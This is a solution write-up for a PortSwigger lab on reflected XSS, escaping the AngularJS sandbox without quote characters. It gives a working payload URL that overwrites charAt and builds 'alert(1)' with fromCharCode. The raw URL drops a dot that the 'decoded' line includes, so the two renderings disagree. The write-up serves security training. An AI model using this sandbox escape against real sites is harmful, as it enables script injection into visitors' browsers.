# Lab 30 — Reflected XSS with AngularJS sandbox escape without strings

> **Expert** · [Official lab](https://portswigger.net/web-security/cross-site-scripting/contexts/client-side-template-injection/lab-angular-sandbox-escape-without-strings)

**Entry point:** quotes are blocked — build strings with `fromCharCode` and
break the sandbox by overwriting `charAt`.

## Solution

Visit (or deliver):

```
/?search=1&toString().constructor.prototypecharAt=[].join;[1]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)=1
```

(decoded: `...prototype.charAt=[].join;[1]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)=1`)

- `toString().constructor.prototype.charAt=[].join` overwrites `charAt` on
  every string → breaks the sandbox's word-list checks.
- `fromCharCode(120,61,...)` builds `x=alert(1)` without quotes; the
  `orderBy` filter evaluates it — lab solved.
